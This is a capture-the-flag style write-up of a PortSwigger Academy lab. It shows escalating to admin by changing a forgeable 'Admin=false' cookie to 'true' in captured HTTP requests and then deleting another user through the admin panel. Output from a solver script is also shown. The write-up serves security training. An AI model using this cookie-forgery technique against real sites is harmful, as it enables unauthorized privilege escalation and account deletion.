# Lab: User role controlled by request parameter

### Instructions

This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

### Solution

Logging into the site with the provided credentials we can capture the request in Burp and find an interesting cookie:

```
GET /my-account?id=wiener HTTP/1.1
Host: 0a0f009804eda3698090bca1004200f1.web-security-academy.net
Cookie: session=8oz5JSt2HOvYeEc5Jwgfo2oOsFtpE6Y1; Admin=false
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
We see there is an `Admin` cookie set to `false`:

```
Admin=false
```

We can update this to true and resend the request:

```
GET /my-account?id=wiener HTTP/2
Host: 0a0f009804eda3698090bca1004200f1.web-security-academy.net
Cookie: session=8oz5JSt2HOvYeEc5Jwgfo2oOsFtpE6Y1; Admin=true
```

(Or just update the cookie value to `true` in a cookie editor plugin)

This gives us access to the admin panel, where we can delete the user carlos and solve the lab:

```
Home

|
Admin panel

|
My account
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `access_control_03.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_03_user_role_controlled_by_request_parameter]
└─$ python access_control_03.py https://0a0400aa0383aa7f80f9767b00920004.web-security-academy.net/
[+] Deleted Carlos... Lab solved
```